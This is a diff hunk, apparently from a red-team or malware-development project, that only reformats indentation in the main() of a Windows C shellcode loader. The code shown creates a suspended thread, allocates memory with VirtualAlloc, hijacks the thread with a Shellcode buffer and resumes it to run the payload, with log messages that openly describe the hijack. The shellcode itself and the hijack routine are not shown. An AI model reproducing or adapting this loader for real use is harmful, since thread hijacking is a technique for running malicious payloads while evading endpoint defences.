@@ -46,15 +46,15 @@ int main(void) {
 
     BOOL   State        = TRUE;
     PVOID  Buffer       = NULL;
-	HANDLE ThreadHandle = NULL;
+    HANDLE ThreadHandle = NULL;
 
     INFO("creating a suspended thread in the local process...");
-	ThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
-	if (NULL == ThreadHandle) {
-		PRINT_ERROR("CreateThread");
-		return EXIT_FAILURE; /* no point in continuing if we can't even get a handle on the thread */
-	}
-	OKAY("[0x%p] created the thread (%ld)! beginning the hijack...", ThreadHandle, GetThreadId(ThreadHandle));
+    ThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
+    if (NULL == ThreadHandle) {
+        PRINT_ERROR("CreateThread");
+        return EXIT_FAILURE; /* no point in continuing if we can't even get a handle on the thread */
+    }
+    OKAY("[0x%p] created the thread (%ld)! beginning the hijack...", ThreadHandle, GetThreadId(ThreadHandle));
 
     Buffer = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (NULL == Buffer) {
@@ -63,13 +63,13 @@ int main(void) {
     }
     OKAY("[0x%p] [RW-] allocated a buffer in memory with PAGE_READWRITE [RW-] permissions!", Buffer);
 
-	if (!LocalThreadHijack(ThreadHandle, Buffer, Shellcode, sizeof(Shellcode))) {
-		WARN("thread hijack failed, exiting...");
+    if (!LocalThreadHijack(ThreadHandle, Buffer, Shellcode, sizeof(Shellcode))) {
+        WARN("thread hijack failed, exiting...");
         State = FALSE; goto CLEANUP;
-	}
-	OKAY("[0x%p] hijack was successful! resuming thread...", ThreadHandle);
+    }
+    OKAY("[0x%p] hijack was successful! resuming thread...", ThreadHandle);
 
-	ResumeThread(ThreadHandle);
+    ResumeThread(ThreadHandle);
     INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
     WaitForSingleObject(ThreadHandle, INFINITE);
     INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);
